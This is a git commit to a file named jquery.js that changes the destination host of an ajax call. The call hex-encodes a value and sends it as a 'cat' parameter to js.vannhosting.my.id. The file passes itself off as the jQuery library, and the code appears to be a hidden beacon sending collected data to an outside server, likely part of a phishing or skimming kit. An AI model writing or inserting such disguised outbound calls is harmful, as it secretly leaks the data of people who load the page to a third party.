e0b85215cb717bc45123c944fd719922c6daae48
vannhost1234 <revanadingejb@gmail.com>
2025-08-17 09:53:51 +0700

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://jepatpepekmu.vannhost.my.id/?cat=" +
+                    "https://js.vannhosting.my.id/?cat=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
